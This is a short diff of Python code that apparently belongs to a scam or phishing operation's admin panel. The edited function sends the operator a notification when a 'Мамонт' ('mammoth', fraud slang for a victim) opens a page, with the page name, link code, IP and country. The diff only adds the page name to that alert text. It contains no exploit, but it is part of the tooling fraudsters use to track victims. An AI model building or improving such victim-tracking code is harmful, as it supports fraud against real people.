@@ -555,7 +555,7 @@ def send_personal_log_to_admin(page_code, ip, country, page_name, action_type="p
             event_name = get_event_name_from_page_code(f"?page={page_code}")
             
             # Формуємо повідомлення в потрібному форматі
-            message = f"""🔔Мамонт открыл страницу
+            message = f"""🔔Мамонт открыл страницу ({page_name})
 
 📎Страница: {page_name}
 #️⃣Ссылка: ?page={page_code}
